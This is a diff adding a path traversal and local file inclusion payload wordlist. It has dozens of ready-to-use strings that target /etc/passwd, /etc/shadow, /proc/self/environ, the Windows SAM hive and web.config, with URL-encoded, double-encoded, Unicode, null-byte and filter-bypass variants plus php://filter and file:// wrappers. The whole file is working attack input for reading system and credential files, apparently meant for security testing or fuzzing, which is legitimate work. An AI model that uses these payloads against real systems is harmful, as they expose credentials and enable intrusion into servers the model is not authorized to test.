@@ -1,0 +1,63 @@
+# Path Traversal / Directory Traversal Payloads
+# Each line is a test payload for Local File Inclusion (LFI) / path traversal
+
+# Unix/Linux
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../etc/shadow
+../../etc/hosts
+../../../proc/self/environ
+../../etc/issue
+../../../etc/group
+
+# Windows
+..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\win.ini
+..\..\windows\system.ini
+..\..\..\boot.ini
+..\..\windows\system32\config\sam
+
+# URL-encoded
+..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5Cwindows%5Cwin.ini
+
+# Double URL-encoded
+..%252F..%252Fetc%252Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+
+# Unicode/UTF-8 encoding
+..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+# Null byte injection (for older systems)
+../../etc/passwd%00
+../../etc/passwd%00.html
+../../etc/passwd%00.jpg
+
+# Dot-dot variations
+....//....//etc/passwd
+....\/....\/etc/passwd
+..../..../etc/passwd
+
+# Filter bypass
+/..%252F..%252F..%252Fetc/passwd
+/.%2e/%2e%2e/%2e%2e/etc/passwd
+/..;/..;/..;/etc/passwd
+
+# Proc filesystem (Linux)
+../../../proc/self/cmdline
+../../../proc/self/status
+../../../proc/self/fd/0
+../../../proc/version
+
+# Additional Windows targets
+..\..\..\..\inetpub\wwwroot\web.config
+..\..\..\..\windows\debug\netsetup.log
+
+# Wrapper / protocol bypass
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index.php
